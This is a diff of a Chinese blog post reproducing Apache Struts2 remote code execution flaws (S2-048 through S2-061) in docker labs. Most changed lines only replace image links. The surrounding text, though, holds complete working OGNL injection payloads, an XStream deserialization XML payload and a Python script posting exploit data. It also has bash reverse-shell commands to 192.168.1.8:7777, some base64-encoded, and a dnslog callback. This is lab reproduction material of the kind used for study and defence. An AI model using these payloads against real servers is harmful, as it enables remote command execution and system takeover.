-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101210064.png" alt="image-20210913101210064"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101210064.png" alt="image-20210913101210064"></p>
 <p>这里需要进行00截断，进入hex将30改为00</p>
 <p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101222214.png" alt="image-20210913101222214"></p>
 <p>然后发包，可以看到X-Test这个地方已经执行了1+99并输出了结果</p>
@@ -381,43 +381,43 @@
 <p>那么这里就可以构造一个poc进行bash反弹，还是要进行00阶段，nc监听端口，发包即可得到反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\x00b&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101301413.png" alt="image-20210913101301413"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101301413.png" alt="image-20210913101301413"></p>
 <h1 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h1><p>这个漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用。</p>
 <p>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同事这个 getText() 的 参数输入点，又可以被用户直接进行控制，用户可控的值添加到 ActionMessage 并在客户前端展示，导致其进入 getText 函数，最后 message 被当作 ognl 表达式执行如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击。</p>
 <p>进入s2-048的docker环境</p>
 <p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101310033.png" alt="image-20210913101310033"></p>
 <p>进入<code>http://192.168.1.8:8080/integration/saveGangster.action</code>漏洞页面，尝试运算1+1</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101319379.png" alt="image-20210913101319379"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101319379.png" alt="image-20210913101319379"></p>
 <p>可以看到这里得到了运算结果，说明存在漏洞</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101328923.png" alt="image-20210913101328923"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101328923.png" alt="image-20210913101328923"></p>
 <p>那么这里构造一个payload用来输出id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913102257991.png" alt="image-20210913102257991"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913102257991.png" alt="image-20210913102257991"></p>
 <p>构造payload输出whoami</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913102303685.png" alt="image-20210913102303685"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913102303685.png" alt="image-20210913102303685"></p>
 <h1 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h1><p>s2-052产生漏洞的原因是REST插件使用到XStreamHandler处理xml数据，由于未对xml数据做任何过滤，在进行发序列xml数据转换为Object时导致RCE</p>
 <p>进入s2-052的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101351194.png" alt="image-20210913101351194"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101351194.png" alt="image-20210913101351194"></p>
 <p>进入页面后随便点击一个成员进行编辑并点击submit进行抓包</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101403121.png" alt="image-20210913101403121"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101403121.png" alt="image-20210913101403121"></p>
 <p>这里可以看到Content-Type为<code>application/x-www-form-urlencoded</code></p>
 <p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101410808.png" alt="image-20210913101410808"></p>
 <p>构造一个xml文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;&lt;/entry&gt;&lt;/map&gt;</span><br></pre></td></tr></table></figure>
 
 <p>首先将Content-Type改为<code>application/xml</code>，然后将xml文件插入，发包返回500证明已经成功</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101419847.png" alt="image-20210913101419847"></p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101430373.png" alt="image-20210913101430373"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101419847.png" alt="image-20210913101419847"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101430373.png" alt="image-20210913101430373"></p>
 <p>进入tmp目录查看success文件已经创建成功</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913102331073.png" alt="image-20210913102331073"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913102331073.png" alt="image-20210913102331073"></p>
 <h1 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h1><p>s2-053漏洞产生的原因是Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
 <p>进入s2-053的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101449643.png" alt="image-20210913101449643"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101449643.png" alt="image-20210913101449643"></p>
 <p>首先执行<code>%&#123;33-1&#125;</code>并提交，可以看到在Your url的地方运算出了结果，说明存在漏洞</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101458066.png" alt="image-20210913101458066"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101458066.png" alt="image-20210913101458066"></p>
 <p>构造payload输出id并提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
 
@@ -425,15 +425,15 @@
 <p>执行bash反弹命令，用nc监听端口即可得到反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101516678.png" alt="image-20210913101516678"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101516678.png" alt="image-20210913101516678"></p>
 <h1 id="S2-057"><a href="#S2-057" class="headerlink" title="S2-057"></a>S2-057</h1><p>s2-057漏洞产生于网站配置XML时如果没有设置namespace的值，并且上层动作配置中并没有设置或使用通配符namespace时，可能会导致远程代码执行漏洞的发生。同样也可能因为url标签没有设置value和action的值，并且上层动作并没有设置或使用通配符namespace，从而导致远程代码执行漏洞的发生。</p>
 <p>alwaysSelectFullNamespace被设置为true，此时namespace的值是从URL中获取的。URL是可控的，所以namespace也是可控的action元素没有名称空间属性集，或者使用通配符。该名称空间将由用户从URL传递并解析为OGNL表达式，最终导致远程代码执行的脆弱性。</p>
 <p>进入s2-057的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101524474.png" alt="image-20210913101524474"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101524474.png" alt="image-20210913101524474"></p>
 <p>首先构造12+34回车</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101534689.png" alt="image-20210913101534689"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101534689.png" alt="image-20210913101534689"></p>
 <p>发现运算出了结果，说明存在漏洞</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101542769.png" alt="image-20210913101542769"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101542769.png" alt="image-20210913101542769"></p>
 <p>构造payload输出id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123; (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#x27;struts.valueStack&#x27;].context).(#cr=#ct[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
 
@@ -445,22 +445,22 @@
 <p>bp抓包在GET处进行拼接得到id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /struts2-showcase/%24%7B%20(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B%27struts.valueStack%27%5D.context).(%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action HTTP/1.1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101558935.png" alt="image-20210913101558935"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101558935.png" alt="image-20210913101558935"></p>
 <p>在exec处修改要执行得命令即可</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101611944.png" alt="image-20210913101611944"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101611944.png" alt="image-20210913101611944"></p>
 <h1 id="S2-059"><a href="#S2-059" class="headerlink" title="S2-059"></a>S2-059</h1><p>s2-059产生的原因为攻击者可以通过构造恶意的OGNL表达式，并将其设置到可被外部输入进行修改，且会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析，最终造成远程代码执行的影响。</p>
 <p>进入s2-059的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101621863.png" alt="image-20210913101621863"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101621863.png" alt="image-20210913101621863"></p>
 <p>访问8080看到有一个input:id</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101636847.png" alt="image-20210913101636847"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101636847.png" alt="image-20210913101636847"></p>
 <p>传参id=2进入发现出现在了input id:这个地方</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101644564.png" alt="image-20210913101644564"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101644564.png" alt="image-20210913101644564"></p>
 <p>这里构造<code>id=%25&#123;10*10&#125;</code>，发现自动进行了运算</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101652122.png" alt="image-20210913101652122"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101652122.png" alt="image-20210913101652122"></p>
 <p>使用bash反弹，先进行编码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101703940.png" alt="image-20210913101703940"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101703940.png" alt="image-20210913101703940"></p>
 <p>编码后结果如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
 
@@ -468,32 +468,32 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsurl = &quot;http://127.0.0.1:8080&quot;data1 = &#123;&quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;&#125;data2 = &#123;&quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;))&#125;&quot;&#125;res1 = requests.post(url, data=data1)res2 = requests.post(url, data=data2)</span><br></pre></td></tr></table></figure>
 
 <p>执行即可得到反弹shell</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101714450.png" alt="image-20210913101714450"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101714450.png" alt="image-20210913101714450"></p>
 <h1 id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h1><p>s2-061漏洞产生的原因是Struts2 会对某些标签属性(比如 <code>id</code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 <code>%&#123;x&#125;</code> 且 <code>x</code> 的值用户可控时，用户再传入一个 <code>%&#123;payload&#125;</code> 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过</p>
 <p>进入s2-061的docker环境</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101725120.png" alt="image-20210913101725120"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101725120.png" alt="image-20210913101725120"></p>
 <p>还是构造一个<code>%25&#123;10*10&#125;</code>发现运算成功，证明漏洞存在</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101735074.png" alt="image-20210913101735074"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101735074.png" alt="image-20210913101735074"></p>
 <p>bp在<code>index.action</code>页面抓包</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101805551.png" alt="image-20210913101805551"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101805551.png" alt="image-20210913101805551"></p>
 <p>修改<code>Content-Type</code>如下并添加数据，这里如果直接使用GET方法是得不到回显的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF------WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Disposition: form-data; name=&quot;id&quot;%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;id&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101813523.png" alt="image-20210913101813523"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101813523.png" alt="image-20210913101813523"></p>
 <p>改为POST方法即可得到id</p>
 <p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101825067.png" alt="image-20210913101825067"></p>
 <p>配合dnslog食用同理</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Disposition: form-data; name=&quot;id&quot;%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;ping 9vll55.dnslog.cn&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101834104.png" alt="image-20210913101834104"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101834104.png" alt="image-20210913101834104"></p>
 <p>bash反弹命令需要先进行编码，同之前操作</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101847935.png" alt="image-20210913101847935"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101847935.png" alt="image-20210913101847935"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Disposition: form-data; name=&quot;id&quot;%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>
 
 <p>nc监听端口即可得到反弹shell</p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101858443.png" alt="image-20210913101858443"></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101858443.png" alt="image-20210913101858443"></p>
 
         </div>
         
@@ -583,7 +583,7 @@
                     <a class="tag-none-link" href="/tags/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/" rel="tag">Struts2漏洞复现总结</a>
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2021-12-14</span>
+                <span>最后编辑：2022-12-06</span>
                 </div>
             </div>
         </footer>
@@ -685,7 +685,7 @@
   <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
     <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
       <div class="tag-clouds">
